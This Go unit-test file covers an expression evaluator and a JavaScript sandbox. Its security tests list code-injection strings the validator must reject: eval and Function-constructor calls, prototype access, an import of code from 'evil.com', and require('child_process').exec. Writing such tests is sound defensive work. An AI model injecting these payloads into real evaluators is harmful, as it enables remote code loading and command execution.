package expr

import (
	"context"
	"testing"
)

func TestEvalBody(t *testing.T) {
	state := map[string]any{"value": 10, "name": "hermes", "items": []any{1, 2, 3}}

	cases := []struct {
		body string
		want bool
	}{
		{"return (state.value) === (10);", true},
		{"return (state.value) > (5);", true},
		{"return String(state.name).includes(\"her\");", true},
		{"return String(state.name).startsWith(\"her\");", true},
		{"return state.items.length > 2;", true},
		{"return (state.value) === (20);", false},
		{"return state.missing;", false},
		{"throw new Error('boom');", false}, // EvalBody returns err, caller defaults to else
	}

	for _, c := range cases {
		got, err := EvalBody(context.Background(), c.body, state)
		if c.body == "throw new Error('boom');" {
			if err == nil {
				t.Errorf("expected error for %q", c.body)
			}
			continue
		}
		if err != nil {
			t.Errorf("EvalBody(%q) unexpected error: %v", c.body, err)
			continue
		}
		if got != c.want {
			t.Errorf("EvalBody(%q) = %v, want %v", c.body, got, c.want)
		}
	}
}

func TestEvalValue(t *testing.T) {
	state := map[string]any{"value": "admin"}
	got, err := EvalValue(context.Background(), "state.value", state)
	if err != nil {
		t.Fatal(err)
	}
	if got != "admin" {
		t.Errorf("EvalValue = %v, want admin", got)
	}
}

func TestEvalValueSecurity(t *testing.T) {
	state := map[string]any{"value": "safe"}
	
	// Test cases that should be rejected due to code injection attempts
	unsafeCases := []struct {
		name string
		expr string
	}{
		{"break out with parentheses", `"); malicious_code(); ("`},
		{"function call", `eval("alert(1)")`},
		{"Function constructor", `new Function("return alert(1)")()`},
		{"setTimeout", `setTimeout("alert(1)", 0)`},
		{"variable declaration", `var x = 1; x`},
		{"let declaration", `let x = 1; x`},
		{"const declaration", `const x = 1; x`},
		{"delete operator", `delete state.value`},
		{"void operator", `void state.value`},
		{"__proto__ access", `state.__proto__`},
		{"constructor access", `state.constructor["constructor"]`},
		{"globalThis access", `globalThis`},
		{"window access", `window`},
		{"import statement", `import("http://evil.com/malicious.js")`},
		{"require statement", `require("child_process").exec("ls")`},
		{"class definition", `class Evil {}`},
		{"debugger statement", `debugger`},
		{"with statement", `with(state) { value }`},
		{"unbalanced parentheses", `state.value) + (state.value`},
		{"unbalanced brackets", `state.value] + [state.value`},
	}
	
	for _, tc := range unsafeCases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := EvalValue(context.Background(), tc.expr, state)
			if err == nil {
				t.Errorf("expected error for unsafe expression %q, got nil", tc.expr)
			}
		})
	}
	
	// Test cases that should be allowed (safe expressions)
	safeCases := []struct {
		name string
		expr string
		want any
	}{
		{"simple property access", `state.value`, "safe"},
		{"nested property access", `state.nested.value`, "nested"},
		{"string comparison", `state.value === "safe"`, true},
		{"arithmetic", `state.count + 1`, int64(1)},
		{"array access", `state.items[0]`, "first"},
		{"ternary operator", `state.value ? "yes" : "no"`, "yes"},
		{"string methods", `state.value.toUpperCase()`, "SAFE"},
		{"logical AND", `state.value && state.value`, "safe"},
		{"logical OR", `state.missing || "default"`, "default"},
	}
	
	for _, tc := range safeCases {
		t.Run(tc.name, func(t *testing.T) {
			stateWithExtra := map[string]any{
				"value": "safe",
				"count": float64(0),
				"items": []any{"first"},
				"nested": map[string]any{"value": "nested"},
			}
			got, err := EvalValue(context.Background(), tc.expr, stateWithExtra)
			if err != nil {
				t.Errorf("unexpected error for safe expression %q: %v", tc.expr, err)
			}
			if got != tc.want {
				t.Errorf("EvalValue(%q) = %v, want %v", tc.expr, got, tc.want)
			}
		})
	}
}

func TestValidateExpression(t *testing.T) {
	// Test empty expression
	if err := ValidateExpression(""); err == nil {
		t.Error("expected error for empty expression")
	}
	
	// Test dangerous patterns
	dangerous := []string{
		`eval("alert(1)")`,
		`new Function("return alert(1)")()`,
		`setTimeout("alert(1)", 0)`,
		`var x = 1`,
		`let x = 1`,
		`const x = 1`,
		`delete obj.prop`,
		`void 0`,
		`state.__proto__`,
		`state.constructor["constructor"]`,
		`globalThis`,
		`window`,
		`import("http://evil.com")`,
		`require("child_process")`,
		`class Evil {}`,
		`debugger`,
		`with(state) { value }`,
	}
	
	for _, d := range dangerous {
		if err := ValidateExpression(d); err == nil {
			t.Errorf("expected error for dangerous expression %q", d)
		}
	}
	
	// Test safe expressions
	safe := []string{
		`state.value`,
		`state.value === "test"`,
		`state.count + 1`,
		`state.items[0]`,
		`state.value ? "yes" : "no"`,
		`state.value.toUpperCase()`,
		`state.a && state.b`,
		`state.a || state.b`,
	}
	
	for _, s := range safe {
		if err := ValidateExpression(s); err != nil {
			t.Errorf("unexpected error for safe expression %q: %v", s, err)
		}
	}
}

func TestRunSandbox(t *testing.T) {
	state := map[string]any{"text": "hello"}
	code := `return { upper: state.text.toUpperCase() };`
	res, err := RunSandbox(context.Background(), code, state)
	if err != nil {
		t.Fatal(err)
	}
	m, ok := res.(map[string]any)
	if !ok {
		t.Fatalf("expected map result, got %T", res)
	}
	if m["upper"] != "HELLO" {
		t.Errorf("upper = %v, want HELLO", m["upper"])
	}
}

func TestRunSandboxMasksGlobals(t *testing.T) {
	code := `return { hasFetch: typeof fetch, hasWindow: typeof window };`
	res, err := RunSandbox(context.Background(), code, map[string]any{})
	if err != nil {
		t.Fatal(err)
	}
	m := res.(map[string]any)
	if m["hasFetch"] != "undefined" || m["hasWindow"] != "undefined" {
		t.Errorf("globals not masked: %v", m)
	}
}

func TestRunSandboxSyntaxError(t *testing.T) {
	if _, err := RunSandbox(context.Background(), "return {{ bad", map[string]any{}); err == nil {
		t.Fatal("expected syntax error")
	}
}

func TestString(t *testing.T) {
	cases := []struct {
		in   any
		want string
	}{
		{"abc", "abc"},
		{float64(5), "5"},
		{float64(5.5), "5.5"},
		{true, "true"},
		{map[string]any{}, "[object Object]"},
		{[]any{}, "[object Object]"},
	}
	for _, c := range cases {
		if got := String(c.in); got != c.want {
			t.Errorf("String(%v) = %q, want %q", c.in, got, c.want)
		}
	}
}
